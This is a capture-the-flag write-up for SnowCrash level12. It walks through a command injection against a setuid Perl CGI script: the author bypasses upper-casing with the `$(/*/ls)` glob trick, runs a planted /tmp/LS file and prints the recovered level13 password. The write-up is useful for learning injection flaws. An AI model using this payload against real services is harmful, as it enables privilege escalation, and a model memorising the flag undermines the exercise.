# Objective

As `level12`, the goal is to exploit a vulnerability to gain `flag12`'s privileges and read the flag, which is the password for `level13`.

The flag is gained through the command `getflag`, run as `flag12`.

```sh
level12@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

```sh
level12@SnowCrash:~$ pwd
/home/user/level12

level12@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout*
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
-r-x------  1 level12 level12  675 Apr  3  2012 .profile*
```

```pl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

```sh
level12@SnowCrash:~$ ss -nltp
State      Recv-Q Send-Q                                                         Local Address:Port                                                           Peer Address:Port 
LISTEN     0      128                                                                       :::4646                                                                     :::*     
LISTEN     0      128                                                                       :::4747                                                                     :::*     
LISTEN     0      128                                                                       :::80                                                                       :::*     
LISTEN     0      128                                                                       :::4242                                                                     :::*     
LISTEN     0      128                                                                        *:4242                                                                      *:*     
LISTEN     0      32                                                                 127.0.0.1:5151                                                                      *:* 
```

# Resolution

The code transforms every input into upper case character.

Then, `egrep` injection will fail.

The idea is to redirect the program to a file we made, containing the command to be injected.


How to understand the code:

```pl
perl -e '$xx="\$(/*/ls)"; $xx =~ tr/a-z/A-Z/; $xx =~ s/\s.*//; $out =`echo "^$xx"`; print $out . "\n"'
```


```sh
level12@SnowCrash:~$ cat > /tmp/LS
getflag | wall

level12@SnowCrash:~$ curl 'http://127.0.0.1:4646/?x=$(/*/ls)&y=x'; echo
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 18:17 ...                                               
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
                                                                               
..

level12@SnowCrash:~$ su - level13
Password: # g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$ 
```

